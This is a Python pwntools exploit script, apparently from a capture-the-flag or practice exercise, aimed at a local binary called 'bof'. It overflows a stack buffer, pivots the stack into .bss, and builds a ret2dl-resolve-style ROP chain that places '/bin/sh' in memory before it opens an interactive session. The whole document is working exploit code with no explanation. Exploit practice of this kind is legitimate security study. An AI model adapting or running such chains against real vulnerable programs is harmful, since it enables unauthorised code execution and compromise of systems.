from pwn import *

elf = ELF('bof')
r=process('./bof')
rop=ROP('./bof')

offset=112
bss_addr=elf.bss()

stack_size=0x800
base_stage=bss_addr+stack_size

rop.raw('a'*offset)
rop.read(0,base_stage,100)
rop.migrate(base_stage)
r.sendline(rop.chain())

rop=ROP('./bof')
sh="/bin/sh"
plt0=elf.get_section_by_name('.plt').header.sh_addr
write_index=(elf.plt['write']-plt0)/16-1
write_index*=8
rop.raw(plt0)
rop.raw(write_index)

rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage+80)
rop.raw(len(sh))
rop.raw('a'*(80-len(rop.chain())))

rop.raw(sh)
rop.raw('a'*(100-len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
